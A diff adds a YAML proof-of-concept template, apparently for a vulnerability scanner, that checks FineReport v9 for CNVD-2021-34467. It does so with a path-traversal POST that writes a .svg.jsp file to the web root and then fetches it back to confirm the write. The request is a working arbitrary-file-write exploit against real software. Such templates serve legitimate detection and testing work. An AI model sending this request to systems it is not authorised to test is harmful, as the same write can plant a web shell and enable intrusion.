@@ -1,0 +1,24 @@
+name: poc-yaml-finereport-v9-cnvd-2021-34467
+set:
+  r: randomLowercase(10)
+rules:
+  - method: POST
+    path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../{{r}}.svg.jsp
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: '{"__CONTENT__":{{r}},"__CHARSET__":"UTF-8"}'
+    follow_redirects: false
+    expression: true
+
+  - method: GET
+    path: /WebReport/{{r}}.svg.jsp
+    follow_redirects: false
+    expression: |
+      response.status==200 &&
+      response.body.bcontains(bytes(r))
+detail:
+  finereport_version: 9
+  author: Infiltrator(https://github.com/NHPT)
+  references: 
+    - https://www.freebuf.com/articles/web/271623.html
+    - https://blog.csdn.net/qq_32261191/article/details/116375931
